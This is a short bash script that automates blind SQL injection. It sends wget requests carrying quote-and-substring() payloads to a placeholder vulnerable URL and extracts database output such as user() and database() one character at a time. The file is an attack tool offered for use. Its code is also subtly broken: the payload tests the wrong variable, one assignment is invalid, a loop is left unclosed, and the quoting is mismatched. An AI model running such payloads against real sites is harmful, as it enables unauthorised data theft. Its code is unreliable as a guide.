#!/bin/bash

#bash blind_sql_query_on_terminal.sh <maximum_expected_length_of_input_string> "<input_sql_query>"
# bash blind_sql_query_on_terminal.sh 20 "Select user()"
# bash blind_sql_query_on_terminal.sh 20 "Select database()" //current database

charset=`echo {0..9} {A..z} \. \: \, \; \- \_ \@`

export URL="http://terget_site.com/vulnerable" # or vulnerable.php/vuln.html etc
export truestring="string on rendering in html page that match weather it is true condition"
export maxlength=$1
export query=$2

export result="" # length of character , input on command line 
# bash blind.sh 10 // if this is 10 charater long string
echo "Extracting the results for $query ....."
for ((j=1;j<maxlength; j+=1))
do
    export nthchar=$j
    for i in $charset
    do
# URL?something.php=adrianalvird' ,  adding a quote and inject a sql
#modify parameter name and input as require in particuler site
        wget "$URL?parameter_name=parameter_input' and substring(($query),$nthchar,1)="$1" -q -O - | grep "$truestring" &> /dev/null    
        if [ "$?" == "0" ]
        then
            echo Character Number $nthchar found: $1
            export result +=$i
            break
        fi
    done
echo Result: $result
